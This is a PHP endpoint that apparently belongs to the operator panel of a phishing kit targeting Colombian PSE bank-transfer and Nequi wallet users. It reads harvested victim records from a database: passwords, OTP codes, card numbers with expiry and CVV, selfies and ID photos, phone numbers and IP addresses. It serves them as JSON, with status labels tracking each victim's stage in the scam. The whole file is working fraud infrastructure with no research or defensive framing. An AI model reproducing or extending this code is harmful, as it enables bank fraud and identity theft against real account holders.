<?php
// god/api.php
error_reporting(0);
header('Content-Type: application/json');

try {
    require_once __DIR__ . '/../pagos/db.php';

    function getSt($s, $t) {
        $s = (int)$s;
        if ($t === 'nequi') {
             switch($s) {
                case 1: return ['text'=>'⚠️ Acción Requerida', 'class'=>'status-waiting'];
                case 2: return ['text'=>'Error Login', 'class'=>'status-error'];
                case 3: return ['text'=>'Esperando OTP', 'class'=>'status-info'];
                case 7: case 0: return ['text'=>'Finalizado', 'class'=>'status-done'];
                default: return ['text'=>'Procesando...', 'class'=>'status-badge'];
             }
        }
        switch($s) {
            case 1:  return ['text'=>'⚠️ Acción Requerida', 'class'=>'status-waiting'];
            case 17: return ['text'=>'🔍 Consulta Realizada', 'class'=>'status-info'];
            case 18: return ['text'=>'👤 Datos de Contacto', 'class'=>'status-success'];
            case 7:  case 0: return ['text'=>'Finalizado', 'class'=>'status-done'];
            case 5:  return ['text'=>'💳 Tarjeta Recibida', 'class'=>'status-purple'];
            default: return ['text'=>'Procesando...', 'class'=>'status-badge'];
        }
    }

    $colsPse = "id, banco, ip_address, usuario, email, clave, otp, tarjeta, fecha, fecha_exp, cvv, estado, "
             . "foto_selfie, foto_front, foto_back, linea_consultada, tel_contacto";
    
    $stmt = $conn->query("SELECT $colsPse FROM pse ORDER BY id DESC LIMIT 50");
    $rowsPse = $stmt->fetchAll(PDO::FETCH_ASSOC);

    $all = [];
    foreach ($rowsPse as $r) {
        $st = getSt($r['estado'], 'pse');
        $all[] = [
            'id' => $r['id'], 'type' => 'pse', 'bank' => $r['banco'] ?: 'PSE',
            'ip' => $r['ip_address'] ?: 'sin ip', 'user' => $r['usuario'] ?: 'N/A',
            'email' => $r['email'] ?: '', 'linea' => $r['linea_consultada'] ?: '',
            'tel_contacto' => $r['tel_contacto'] ?: '', 'pass' => $r['clave'] ?: '***',
            'otp' => $r['otp'] ?: '', 'tarjeta' => $r['tarjeta'] ?: '',
            'expiry' => $r['fecha_exp'] ?: '', // MAPEO CORRECTO
            'cvv' => $r['cvv'] ?: '',
            'status_id' => $r['estado'], 'status_text' => $st['text'],
            'status_class' => 'status-badge ' . $st['class'], 'date' => $r['fecha'] ?: ''
        ];
    }

    // Nequi
    try {
        $colsNequi = "id, celular, clave, saludo, saldo, otp, dispositivo, estado, fecha, ip_address";
        $stmt2 = $conn->query("SELECT $colsNequi FROM nequi ORDER BY id DESC LIMIT 50");
        $rowsNequi = $stmt2->fetchAll(PDO::FETCH_ASSOC);
        foreach ($rowsNequi as $r) {
            $st = getSt($r['estado'], 'nequi');
            $all[] = [
                'id' => $r['id'], 'type' => 'nequi', 'bank' => 'Nequi',
                'ip' => $r['ip_address'] ?: 'sin ip', 'user' => $r['celular'] ?: 'N/A',
                'pass' => $r['clave'] ?: '***', 'saldo' => $r['saldo'] ?: '',
                'otp' => $r['otp'] ?: '', 'status_id' => $r['estado'],
                'status_text' => $st['text'], 'status_class' => 'status-badge ' . $st['class'],
                'date' => $r['fecha'] ?: ''
            ];
        }
    } catch (Exception $e) {}

    usort($all, function ($a, $b) {
        return strtotime($b['date'] ?: '1970-01-01') - strtotime($a['date'] ?: '1970-01-01');
    });

    echo json_encode(['status' => 'success', 'data' => $all]);

} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
}
